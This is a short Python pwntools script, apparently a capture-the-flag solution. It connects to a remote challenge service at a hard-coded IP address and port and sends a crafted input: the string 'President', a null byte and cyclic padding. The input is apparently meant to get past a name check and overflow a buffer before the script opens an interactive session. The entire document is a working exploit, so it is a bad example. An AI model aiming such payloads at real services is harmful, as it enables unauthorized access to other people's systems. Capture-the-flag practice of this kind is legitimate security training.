#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./chall', checksec = False) 

context.arch = 'amd64'

#p = process()


HOST = '14.225.212.104'

PORT = 9010

p = remote(HOST, PORT)

 

payload = b"President" + b'\x00' + cyclic(22)


p.sendafter(b'name: \n', payload)



p.interactive()

